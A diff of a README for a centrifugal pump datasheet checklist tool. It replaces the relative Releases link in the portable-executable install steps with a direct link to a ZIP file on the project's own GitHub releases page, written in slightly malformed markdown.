@@ -13,7 +13,7 @@ This application provides a structured checklist of 27 critical verification ste
 
 ### Portable Executable
 
-1. Download the latest release from the [Releases](../../releases) page
+1. Download the latest release from the [Releases]([../../releases](https://github.com/HomayounFallahi/pump-datasheet-checker/releases/download/Releases/Check.Vendor.Data.Sheet.and.Performance.Curve.for.a.Centrifugal.Pump.zip) page
 2. Extract the ZIP file to any location on your computer
 3. Run `PumpChecklist.exe` (no installation required)
 4. The application will start immediately
